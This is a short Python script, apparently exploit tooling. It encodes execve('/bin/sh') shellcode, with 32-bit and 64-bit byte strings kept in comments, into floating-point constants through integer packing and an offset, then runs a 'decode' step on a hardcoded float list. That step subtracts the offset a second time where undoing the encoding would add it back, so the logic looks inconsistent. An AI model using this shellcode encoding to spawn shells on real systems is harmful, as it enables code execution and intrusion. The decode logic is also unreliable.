import struct

# shellcode = b"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"
# shellcode = b'\x48\x31\xf6\x56\x48\xbf\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x57\x48\x89\xe7\x48\x31\xd2\x48\x31\xc0\xb0\x02\x48\xc1\xc8\x28\xb0\x3b\x0f\x05'
# 
# shellcode_long = []
# for i in range(int(len(shellcode)/8)+1):
#     shellcode_long.append(struct.unpack('<Q', shellcode[i*8:(i+1)*8].ljust(8, b"\x90"))[0])
# 
# shellcode_float = []
# for i in shellcode_long:
#     shellcode_float.append(struct.unpack("d", struct.pack("Q", i - 0x2000000000000))[0])
# 
# print(shellcode_float)


# decode
shellcode = [2.825563119134789e-71, 3.2060568105999132e-80,-2.5309726874116607e+35, 7.034840446283643e-309]

shellcode_long = []
for i in shellcode:
    shellcode_long.append(struct.unpack("Q", struct.pack("d", i))[0])

shellcode_float = []
for i in shellcode_long:
    shellcode_float.append(struct.unpack("d", struct.pack("Q", i - 0x2000000000000))[0])

print(shellcode_float)
